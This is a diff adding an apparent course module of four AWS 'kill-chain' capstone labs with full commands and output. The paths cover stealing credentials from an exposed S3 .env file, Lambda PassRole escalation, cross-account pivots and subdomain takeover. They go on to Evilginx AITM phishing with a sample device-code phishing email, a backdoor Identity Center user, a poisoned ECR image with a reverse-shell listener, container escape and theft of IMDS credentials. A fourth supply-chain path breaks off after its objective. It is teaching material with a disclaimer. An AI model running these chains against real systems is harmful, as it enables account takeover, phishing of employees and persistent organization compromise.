@@ -1,0 +1,970 @@
+<!-- M21: Capstone — Full Kill-Chain Attack Paths -->
+
+<!-- ============================================================
+     AUTHORIZED TESTING DISCLAIMER
+     ============================================================ -->
+<div class="warning" style="margin-bottom:1.5rem;">
+  <i class="fa-solid fa-triangle-exclamation"></i>
+  <strong>Authorized Testing Only:</strong> This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test. All techniques demonstrated here must only be used in environments you own or have a signed Rules of Engagement document authorizing your testing.
+</div>
+
+<!-- ============================================================
+     M21-L01: Path A — S3 Credentials to Org Admin
+     ============================================================ -->
+<div class="lab-walkthrough-content" id="M21-L01-content">
+
+  <div class="prereq">
+    <i class="fa-solid fa-list-check"></i> <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completed M01 (S3 recon), M16 (Lambda privilege escalation), M18 (cross-account pivoting)</li>
+      <li>AWS CLI configured with lab credentials (profile: <code>capstone-l01</code>)</li>
+      <li>Lab environment provisioned via the course Terraform stack — see setup guide in M21 module intro</li>
+      <li>Note: Each capstone scenario uses its own independent lab environment with different account IDs. The account IDs in this lab (111111111111 / 222222222222 / 444444444444) do not correspond to those used in other capstone paths.</li>
+    </ul>
+  </div>
+
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Full kill-chain from external reconnaissance to organization admin — chaining S3 exposure, credential theft, Lambda privilege escalation, and cross-account pivot.</div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>S3 Recon (M01 techniques):</strong> Discover publicly exposed S3 buckets via certificate transparency logs, DNS enumeration, and common naming patterns.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Certificate transparency + S3 bucket enumeration</div>
+            <div class="terminal-output">$ curl -s "https://crt.sh/?q=%.targetcorp.com&amp;output=json" | \
+  jq -r '.[].name_value' | sort -u | \
+  sed 's/\./-/g' | xargs -I{} aws s3 ls s3://{} 2>/dev/null
+
+2025-11-01 09:00:00 targetcorp-staging-config
+Found: s3://targetcorp-staging-config (publicly accessible)</div>
+            <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-staging-config/ --no-sign-request</div>
+            <div class="terminal-output">2025-11-01  .env
+2025-11-01  docker-compose.yml
+2025-11-01  deploy-config.json</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Extract .env credentials:</strong> Download the exposed environment file containing AWS access keys, database credentials, and API tokens.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws s3 cp s3://targetcorp-staging-config/.env - --no-sign-request</div>
+            <div class="terminal-output">AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+AWS_DEFAULT_REGION=us-east-1
+DB_HOST=staging-db.cluster-xyz.us-east-1.rds.amazonaws.com
+DB_PASSWORD=Stg-Db-2025!</div>
+            <div class="terminal-cmd">$ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+$ aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AIDAJDPLRKLG7UEXAMPLE",
+    "Account": "111111111111",
+    "Arn": "arn:aws:iam::111111111111:user/staging-deploy"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Lambda privilege escalation (M16 PassRole):</strong> The staging-deploy user has <code>lambda:CreateFunction</code> and <code>iam:PassRole</code>. Deploy a Lambda function that assumes an admin role.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Enumerate permissions</div>
+            <div class="terminal-output">$ aws iam list-attached-user-policies --user-name staging-deploy
+StagingDeployPolicy: lambda:*, iam:PassRole, s3:*
+
+$ aws iam list-roles --query 'Roles[?contains(RoleName,`admin`)].[RoleName,Arn]'
+LambdaAdminRole: arn:aws:iam::111111111111:role/LambdaAdminRole</div>
+            <div class="terminal-cmd"># Create escalation Lambda with admin role</div>
+            <div class="terminal-output">$ aws lambda create-function --function-name escalate \
+  --runtime python3.12 --role arn:aws:iam::111111111111:role/LambdaAdminRole \
+  --handler index.handler --zip-file fileb://escalate.zip
+
+$ aws lambda invoke --function-name escalate /tmp/out.json && cat /tmp/out.json
+{"admin": true, "account": "111111111111"}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Cross-account role creation:</strong> Using the Lambda's admin role, create a cross-account trust role and enumerate existing trust chains to production accounts.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Lambda creates bridge role in staging</div>
+            <div class="terminal-output">$ aws iam create-role --role-name AWSConfigBridge \
+  --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111111111111:root"},"Action":"sts:AssumeRole"}]}'
+$ aws iam attach-role-policy --role-name AWSConfigBridge \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</div>
+            <div class="terminal-cmd"># Enumerate cross-account trusts from staging</div>
+            <div class="terminal-output">$ for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
+  aws iam get-role --role-name $role --query 'Role.AssumeRolePolicyDocument' 2>/dev/null
+done | grep -B5 "222222222222\|444444444444"
+Found: CrossAccountDeploy trusts 222222222222 (Prod)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Pivot to management account:</strong> Chain cross-account role assumptions from Staging through Prod to the Organization management account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Staging -> Prod</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::222222222222:role/CrossAccountDeploy \
+  --role-session-name pivot
+Account: 222222222222 (Prod)</div>
+            <div class="terminal-cmd"># Prod -> Management</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::444444444444:role/OrganizationAccountAccess \
+  --role-session-name orgadmin
+Account: 444444444444 (Management)
+
+$ aws organizations describe-organization
+MasterAccountId: 444444444444
+FULL ORG ADMIN ACHIEVED from a single .env file</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Open S3</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">.env Creds</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda Deploy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">IAM Escalation</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Org Admin</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> This path demonstrates how a single misconfigured S3 bucket can cascade into full organization compromise. Each step uses techniques from earlier modules (M01, M16, M18) chained together into a realistic kill-chain.</div>
+
+  <div class="cleanup">
+    <i class="fa-solid fa-broom"></i> <strong>Cleanup:</strong>
+    <ul>
+      <li>Delete the escalation Lambda: <code>aws lambda delete-function --function-name escalate</code></li>
+      <li>Delete the bridge role: <code>aws iam detach-role-policy --role-name AWSConfigBridge --policy-arn arn:aws:iam::aws:policy/AdministratorAccess &amp;&amp; aws iam delete-role --role-name AWSConfigBridge</code></li>
+      <li>Run <code>terraform destroy</code> from the capstone lab directory to tear down all provisioned resources</li>
+      <li>Rotate any lab credentials that were used outside the lab environment</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ============================================================
+     M21-L02: Path B — Subdomain Takeover to Org Compromise
+     ============================================================ -->
+<div class="lab-walkthrough-content" id="M21-L02-content">
+
+  <div class="prereq">
+    <i class="fa-solid fa-list-check"></i> <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completed M02 (subdomain takeover), M12 (phishing/AITM), and M09 (SSO/Identity Center)</li>
+      <li>AWS CLI configured with lab credentials (profile: <code>capstone-l02</code>)</li>
+      <li>A valid ACM certificate ARN for the lab subdomain — provisioned by the course Terraform stack and provided in the lab environment dashboard</li>
+      <li>Evilginx3 installed: <code>go install github.com/kgretzky/evilginx2@latest</code> (see M12 setup notes)</li>
+      <li>Note: Each capstone scenario uses its own independent lab environment with different account IDs.</li>
+    </ul>
+  </div>
+
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Chain subdomain takeover, SSO portal cloning, device-code phishing, and Identity Center abuse to compromise an entire AWS Organization.</div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Subdomain takeover (M02):</strong> Identify a dangling CNAME pointing to an unclaimed CloudFront distribution. Claim a new distribution to serve content at the victim subdomain.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ dig auth-legacy.targetcorp.com CNAME</div>
+            <div class="terminal-output">auth-legacy.targetcorp.com. CNAME d1234567890.cloudfront.net.
+
+$ curl -s https://auth-legacy.targetcorp.com
+ERROR: The request could not be satisfied. (CloudFront distribution not found)</div>
+            <div class="terminal-cmd"># Claim the CloudFront distribution
+# IMPORTANT: Since 2021 AWS CloudFront requires a valid ACM certificate for custom
+# aliases before the distribution can be created.
+#
+# In a real CNAME takeover scenario:
+#   (1) Confirm the dangling CNAME points to an unclaimed distribution
+#   (2) Use a DNS challenge to issue an ACM certificate for the subdomain
+#       (possible once you control a distribution responding at the domain)
+#   (3) Create the CloudFront distribution with the alias + ACM cert ARN
+#
+# The command below requires a pre-provisioned ACM certificate ARN.
+# The lab Terraform stack provisions this automatically; see the lab dashboard
+# for the value of ACM_CERT_ARN.</div>
+            <div class="terminal-output">$ ACM_CERT_ARN="arn:aws:acm:us-east-1:&lt;YOUR-ACCOUNT-ID&gt;:certificate/&lt;YOUR-CERT-ID&gt;"
+
+$ aws cloudfront create-distribution \
+  --origin-domain-name attacker-bucket.s3.amazonaws.com \
+  --default-root-object index.html \
+  --aliases auth-legacy.targetcorp.com \
+  --viewer-certificate "ACMCertificateArn=${ACM_CERT_ARN},SSLSupportMethod=sni-only,MinimumProtocolVersion=TLSv1.2_2021"
+
+Distribution d1234567890.cloudfront.net now serves attacker content</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>SSO portal clone with AITM framework (M12):</strong> Host a credential-harvesting proxy that transparently relays the real AWS SSO login page on the taken-over subdomain.</div>
+        <div class="warning">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+          <strong>Tool Limitation — Do Not Use wget for React/SPA Cloning:</strong>
+          <code>wget -m -k -p</code> cannot faithfully clone single-page applications such as the AWS SSO portal, which is a React app that loads content dynamically via JavaScript. wget only captures the initial HTML shell; all dynamic routes, login flows, and API calls will break. Use an adversary-in-the-middle (AITM) proxy framework instead.
+        </div>
+        <div class="note">
+          <i class="fa-solid fa-circle-info"></i>
+          <strong>Recommended approaches for SPA cloning / AITM phishing:</strong>
+          <ul>
+            <li><strong>Evilginx3</strong> (preferred — true AITM, captures session cookies and MFA tokens in real time): Configure a phishlet for <code>awsapps.com</code> and point DNS to your Evilginx3 listener. Evilginx3 reverse-proxies the real SSO portal transparently.</li>
+            <li><strong>Modlishka</strong>: Similar reverse-proxy AITM approach; simpler phishlet config than Evilginx3.</li>
+            <li><strong>HTTrack</strong>: Suitable for static credential-capture pages only (not SPAs). Use only if you are building a simplified look-alike, not a transparent proxy.</li>
+          </ul>
+        </div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Configure Evilginx3 AITM phishlet for AWS SSO portal</div>
+            <div class="terminal-output">$ evilginx3 -p ./phishlets -c ./config
+[evilginx3] > config domain auth-legacy.targetcorp.com
+[evilginx3] > config ip &lt;ATTACKER-IP&gt;
+[evilginx3] > phishlets hostname aws-sso auth-legacy.targetcorp.com
+[evilginx3] > phishlets enable aws-sso
+[evilginx3] > lures create aws-sso
+[evilginx3] > lures get-url 0
+
+https://auth-legacy.targetcorp.com/start
+Evilginx3 reverse-proxies the real SSO portal transparently
+Valid TLS certificate (ACM cert for targetcorp.com subdomain)
+All credentials and session tokens captured server-side</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Device-code phishing:</strong> Initiate an OAuth device authorization flow and send the user code to targets via phishing email from the legitimate-looking subdomain.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Initiate device authorization flow</div>
+            <div class="terminal-output">$ CLIENT=$(aws sso-oidc register-client \
+  --client-name "AWS CLI" \
+  --client-type public \
+  --scopes sso:account:access \
+  --region us-east-1)
+
+# The --scopes sso:account:access parameter is required to authorize AWS account
+# access via the resulting device tokens. Without it the token exchange succeeds
+# but grants no AWS permissions -- the access token will be accepted by SSO OIDC
+# but list-accounts and get-role-credentials calls will return empty results.
+
+$ CLIENT_ID=$(echo $CLIENT | jq -r '.clientId')
+$ CLIENT_SECRET=$(echo $CLIENT | jq -r '.clientSecret')
+
+$ aws sso-oidc start-device-authorization \
+  --client-id "$CLIENT_ID" \
+  --client-secret "$CLIENT_SECRET" \
+  --start-url https://targetcorp.awsapps.com/start \
+  --region us-east-1
+verificationUri: https://device.sso.us-east-1.amazonaws.com/
+userCode: ABCD-EFGH</div>
+            <div class="terminal-cmd"># Phishing email directs user to enter code ABCD-EFGH</div>
+            <div class="terminal-output">From: security@auth-legacy.targetcorp.com  (taken-over subdomain!)
+Subject: Action Required: Re-authenticate your AWS SSO session
+
+"Your AWS SSO session has expired. Please re-authenticate:
+ 1. Visit https://device.sso.us-east-1.amazonaws.com/
+ 2. Enter code: ABCD-EFGH"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Capture SSO tokens:</strong> Poll for the device authorization to complete. When the victim enters the code, the attacker receives a valid SSO access token.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Poll until victim authorizes</div>
+            <div class="terminal-output">$ aws sso-oidc create-token \
+  --client-id "$CLIENT_ID" \
+  --client-secret "$CLIENT_SECRET" \
+  --grant-type "urn:ietf:params:oauth:grant-type:device_code" \
+  --device-code "device-code-xyz" \
+  --region us-east-1
+
+{
+    "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "tokenType": "Bearer",
+    "expiresIn": 28800
+}</div>
+            <div class="terminal-cmd"># Use token to list available accounts and roles</div>
+            <div class="terminal-output">$ aws sso list-accounts --access-token "eyJhbGci..."
+111111111111 (Dev), 222222222222 (Staging), 333333333333 (Prod), 444444444444 (Mgmt)
+Victim has AdministratorAccess in all accounts!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Backdoor Identity Center:</strong> Use the captured admin SSO token to create persistent permission set assignments across all org accounts.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Create backdoor user in Identity Center</div>
+            <div class="terminal-output">$ aws identitystore create-user --identity-store-id d-1234567890 \
+  --user-name "svc-audit-compliance" --display-name "Audit Service" \
+  --emails '[{"Value":"attacker@protonmail.com","Primary":true}]'
+UserId: u-backdoor123</div>
+            <div class="terminal-cmd"># Assign admin to all accounts</div>
+            <div class="terminal-output">$ for ACCT in 111111111111 222222222222 333333333333 444444444444; do
+  aws sso-admin create-account-assignment \
+    --instance-arn arn:aws:sso:::instance/ssoins-xxx \
+    --target-id $ACCT --target-type AWS_ACCOUNT \
+    --permission-set-arn arn:aws:sso:::permissionSet/ssoins-xxx/ps-admin \
+    --principal-type USER --principal-id u-backdoor123
+done
+
+Backdoor user has admin access to ALL 4 accounts
+Survives credential rotation, password resets, MFA changes
+FULL ORG COMPROMISE from a dangling DNS record</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Subdomain Takeover</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">AITM Proxy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Device Phish</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Token Capture</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Org Compromise</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Device-code phishing is particularly effective because the authorization happens on a legitimate AWS domain. The victim sees the real AWS device authorization page — they have no reason to be suspicious. Always monitor for unauthorized Identity Center user creation and permission set assignments.</div>
+
+  <div class="cleanup">
+    <i class="fa-solid fa-broom"></i> <strong>Cleanup:</strong>
+    <ul>
+      <li>Remove the backdoor Identity Center user: <code>aws identitystore delete-user --identity-store-id d-1234567890 --user-id u-backdoor123</code></li>
+      <li>Delete all account assignments created for the backdoor user before deleting the user</li>
+      <li>Disable and delete the CloudFront distribution created for the takeover</li>
+      <li>Stop and uninstall the Evilginx3 instance; remove the lab phishlet config</li>
+      <li>Run <code>terraform destroy</code> from the capstone lab directory to tear down all provisioned resources</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ============================================================
+     M21-L03: Path C — EKS Container Escape to Org Admin
+     ============================================================ -->
+<div class="lab-walkthrough-content" id="M21-L03-content">
+
+  <div class="prereq">
+    <i class="fa-solid fa-list-check"></i> <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completed M13 (ECR image security), M14 (container escape), M15 (IRSA/EKS IAM), M18 (cross-account pivoting)</li>
+      <li>AWS CLI and <code>kubectl</code> configured for the lab EKS cluster (profile: <code>capstone-l03</code>)</li>
+      <li>Docker installed on attacker machine for image manipulation</li>
+      <li>Lab environment: EKS 1.28 cluster with mixed runtime nodes (one docker.sock node and one containerd node) to practice both escape paths</li>
+      <li>Note: Each capstone scenario uses its own independent lab environment with different account IDs.</li>
+    </ul>
+  </div>
+
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Chain ECR image poisoning, EKS container escape, IRSA token exchange, and cross-account pivot to achieve organization admin from a container foothold.</div>
+
+  <div class="lab-steps">
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>ECR image poisoning (M13):</strong> Push a backdoored container image to ECR, replacing or tagging alongside a legitimate image used by EKS workloads.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Pull legitimate image, inject backdoor, push back</div>
+            <div class="terminal-output">$ aws ecr get-login-password | docker login --username AWS --password-stdin \
+  111111111111.dkr.ecr.us-east-1.amazonaws.com
+
+$ docker pull 111111111111.dkr.ecr.us-east-1.amazonaws.com/api-service:latest
+$ # Inject reverse shell into entrypoint
+$ docker build -t 111111111111.dkr.ecr.us-east-1.amazonaws.com/api-service:latest .
+$ docker push 111111111111.dkr.ecr.us-east-1.amazonaws.com/api-service:latest
+
+Backdoored image pushed -- waiting for next EKS deployment</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>EKS pulls poisoned image:</strong> When the next deployment or pod restart occurs, EKS pulls the backdoored image. The reverse shell connects back to the attacker.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Attacker listener receives reverse shell</div>
+            <div class="terminal-output">$ nc -lvp 4444
+Connection from 10.0.47.23:54321
+
+id
+uid=1000(app) gid=1000(app)
+
+hostname
+api-service-deployment-7b9f4c6d8-xk2j9
+
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ij...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Container escape (M14):</strong> Exploit a privileged container configuration or mounted Docker socket to escape to the underlying EKS node. See the runtime note below — use the appropriate escape path for your node's container runtime.</div>
+        <div class="warning">
+          <i class="fa-solid fa-triangle-exclamation"></i>
+          <strong>EKS 1.24+ uses containerd — docker.sock does not exist on these nodes.</strong>
+          EKS migrated from Docker to containerd as the default container runtime in version 1.24 (released April 2022). On EKS 1.24+ nodes, <code>/var/run/docker.sock</code> will not be present. Attempting the docker.sock escape path will fail silently. Use <code>crictl</code> for container enumeration on containerd nodes, or use the privileged pod + <code>nsenter</code> escape path shown below.
+        </div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Path A: docker.sock escape (EKS &lt; 1.24 / legacy nodes only)
+# Check for docker socket first — if absent, use Path B below</div>
+            <div class="terminal-output">$ mount | grep -i docker
+/dev/xvda1 on /var/run/docker.sock type ext4
+
+$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
+
+root@ip-10-0-47-10:/# hostname
+ip-10-0-47-10.ec2.internal</div>
+            <div class="terminal-cmd"># Path B: nsenter escape for containerd-based EKS nodes (EKS 1.24+)
+# Deploy a privileged pod with hostPID and hostNetwork to reach the node namespace</div>
+            <div class="terminal-output">$ kubectl apply -f - &lt;&lt;EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: node-escape
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: escape
+    image: ubuntu:22.04
+    securityContext:
+      privileged: true
+    command: ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--", "bash"]
+    stdin: true
+    tty: true
+EOF
+
+$ kubectl exec -it node-escape -- bash
+root@ip-10-0-47-10:/# hostname
+ip-10-0-47-10.ec2.internal</div>
+          </div>
+        </div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal — Node IMDS (IMDSv2 required)</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Access node's IMDS for instance role — IMDSv2 two-step (required on IMDSv2-enforced EKS nodes)
+# IMDSv1 (curl -s http://169.254.169.254/latest/meta-data/iam/info) returns HTTP 401
+# on nodes with HttpTokens=required. Always use the two-step IMDSv2 flow.</div>
+            <div class="terminal-output">$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+$ ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+
+{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "IQoJb3JpZ2luX2Vj...",
+  "Expiration": "2025-11-01T18:00:00Z"
+}
+InstanceProfileArn: arn:aws:iam::111111111111:instance-profile/eks-node-role</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>IRSA token exchange (M15):</strong> From the escaped node, access IRSA (IAM Roles for Service Accounts) tokens projected into other pods. Exchange the Kubernetes service account token for AWS credentials.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Find pods with IRSA annotations</div>
+            <div class="terminal-output">$ kubectl get sa --all-namespaces -o json | \
+  jq '.items[] | select(.metadata.annotations["eks.amazonaws.com/role-arn"])'
+SA: data-pipeline-sa
+Role: arn:aws:iam::111111111111:role/DataPipelineRole (cross-account trust!)</div>
+            <div class="terminal-cmd"># Exchange IRSA token for AWS credentials</div>
+            <div class="terminal-output">$ aws sts assume-role-with-web-identity \
+  --role-arn arn:aws:iam::111111111111:role/DataPipelineRole \
+  --role-session-name irsa-pivot \
+  --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
+Credentials for DataPipelineRole (has cross-account access to Prod!)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Cross-account pivot to org admin (M18):</strong> The DataPipelineRole has trust relationships across accounts. Chain role assumptions to reach the management account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># DataPipelineRole -> Prod account</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::222222222222:role/DataPipelineAccess \
+  --role-session-name prod-pivot
+Account: 222222222222 (Prod)</div>
+            <div class="terminal-cmd"># Prod -> Management</div>
+            <div class="terminal-output">$ aws sts assume-role --role-arn arn:aws:iam::444444444444:role/OrgAccess \
+  --role-session-name mgmt
+Account: 444444444444 (Management)
+
+$ aws organizations list-accounts | jq '.Accounts | length'
+12 accounts under attacker control
+
+Kill chain: ECR Poison -> EKS -> Escape -> IRSA -> Cross-Account -> Org Admin</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">ECR Poison</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">EKS Deploy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Container Escape</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">IRSA Exchange</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Cross-Account Admin</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> Container-based kill chains are increasingly common as organizations adopt EKS. Each step exploits a different layer: supply chain (ECR), orchestration (EKS), isolation (container escape), identity (IRSA), and organization structure (cross-account). Defense requires security at every layer.</div>
+
+  <div class="cleanup">
+    <i class="fa-solid fa-broom"></i> <strong>Cleanup:</strong>
+    <ul>
+      <li>Delete the escape pod: <code>kubectl delete pod node-escape</code></li>
+      <li>Remove the backdoored ECR image tag: <code>aws ecr batch-delete-image --repository-name api-service --image-ids imageTag=latest</code> and re-push the clean image</li>
+      <li>Revoke any active sessions created via the IRSA role using <code>aws iam create-policy-version</code> with a deny-all inline policy or by revoking active sessions in the IAM console</li>
+      <li>Run <code>terraform destroy</code> from the capstone lab directory to tear down all provisioned resources</li>
+    </ul>
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<!-- ============================================================
+     M21-L04: Path D — CodeBreach Supply Chain Attack
+     ============================================================ -->
+<div class="lab-walkthrough-content" id="M21-L04-content">
+
+  <div class="prereq">
+    <i class="fa-solid fa-list-check"></i> <strong>Prerequisites:</strong>
+    <ul>
+      <li>Completed M17 (CodeBuild/CI security) and M10 (supply chain attacks)</li>
+      <li>AWS CLI and GitHub CLI (<code>gh</code>) configured with lab credentials (profile: <code>capstone-l04</code>)</li>
+      <li><code>gdb</code> available on the attacker machine for the memory dump step</li>
+      <li>Note: Each capstone scenario uses its own independent lab environment with different account IDs.</li>
+    </ul>
+  </div>
+
+  <div class="lab-objective"><i class="fa-solid fa-crosshairs"></i> <strong>Objective:</strong> Replicate the CodeBreach attack chain — from CodeBuild webhook bypass to GitHub admin access to SDK backdoor deployment affecting thousands of customers.</div>
+
